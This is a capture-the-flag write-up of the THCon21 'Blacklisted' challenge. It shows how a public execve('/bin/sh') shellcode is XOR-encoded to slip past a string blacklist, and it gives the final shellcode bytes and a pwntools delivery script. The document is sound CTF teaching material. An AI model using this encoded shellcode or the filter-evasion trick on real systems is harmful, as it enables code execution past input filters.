---
title: "THCon21 - Blacklisted"
date: 2021-06-14T16:29:05+02:00
draft: false
tags: [pwn]
# image: "/image/blog-pic.jpg"
description: "A shellcoding challenge from THCon21"
showDate: true          # to enable/disable showing dates
math: true              # to enable showing equations (katex)
---

[Go back to write-ups list](../)

> **Category:** Intro
> 
> **Creator:** Voydstack
> 
> **Description:**
> 
> Don't say the magic word !
> 
> **Attachments:**
> - [blacklisted](/files/thcon21/blacklisted)

## Analysing the binary

The attachment is an ELF x64 binary. I opened it in IDA and went to the `main` function. It basically calls `check_blacklist` on the user input, and if it returns 0,the user input will be executed as a shellcode.

*Note: the maximum length for the shellcode is 64 bytes*

Here is the `check_blacklist` function:

![check_blacklist function](/image/thcon21/check_blacklist.png)

And here is the blacklist that comes with it:

![The blacklist](/image/thcon21/blacklist.png)

As you can see, we can't use the words `"/bin/"`, `"/tmp/"`, `"flag.txt"` and `"sh"`, which is kind of annoying considering that most shellcodes just put `/bin/sh` in the right register and call the `execve` shellcode.

## Shellcoding

The first thing I did was to copy a basic x86_64 execve('/bin/sh') shellcode which I found [here](https://www.exploit-db.com/exploits/42179). Now to edit the shellcode, I used an online tool (because I love online tools) to [disassemble from hex and assemble to hex online](https://defuse.ca/online-x86-assembler.htm) which is perfect for shellcoding (and it supports 32-bit and 64-bit). I got this assembly code:

```asm
push   rax
xor    rdx,rdx
xor    rsi,rsi
movabs rbx,0x68732f2f6e69622f

push   rbx
push   rsp
pop    rdi
mov    al,0x3b
syscall
```

The thing moved in rbx is the hexadecimal representation of `hs//bin/` which will make the final shellcode contain both `/bin/` and `sh`, so we need to find a way to prevent this.

I decided to put in the shellcode the string `hs//bin/` xored with `0x4242424242424242` instead of putting it in plain. Now I would just need to xor it with the same value in the shellcode to recover the original string in the register. Here is how I did:

```asm
push   rax
xor    rdx,rdx
xor    rsi,rsi
movabs rbx,0x2a316d6d2c2b206d ; path xored with 0x42
movabs rax,0x4242424242424242 ; xor key
xor    rbx,rax                ; we can't xor rbx with a 64 bits value directly
                              ; so we put the value in rax first
push   rbx
push   rsp
pop    rdi
xor    rax,rax
mov    al,0x3b
syscall
```

*Note: since we altered `rax` to store our xor key, we need to reset rax before setting `al`, because the `syscall` instruction seems to use the entire `rax` registry instead of just `al`*

This gives us our final shellcode :
```
\x50\x48\x31\xD2\x48\x31\xF6\x48\xBB\x6D\x20\x2B\x2C\x6D\x6D\x31\x2A\x48\xB8\x42\x42\x42\x42\x42\x42\x42\x42\x48\x31\xC3\x53\x54\x5F\x48\x31\xC0\xB0\x3B\x0F\x05
```

And here is a little Python script using pwntools to send the shellcode to the remote challenge:

```py
from pwn import *

conn = process("./blacklisted")

conn.recv()
conn.send("\x50\x48\x31\xD2\x48\x31\xF6\x48\xBB\x6D\x20\x2B\x2C\x6D\x6D\x31\x2A\x48\xB8\x42\x42\x42\x42\x42\x42\x42\x42\x48\x31\xC3\x53\x54\x5F\x48\x31\xC0\xB0\x3B\x0F\x05")
conn.interactive()
```

![Script execution](/image/thcon21/blacklisted_solved.png)

[Go back to write-ups list](../)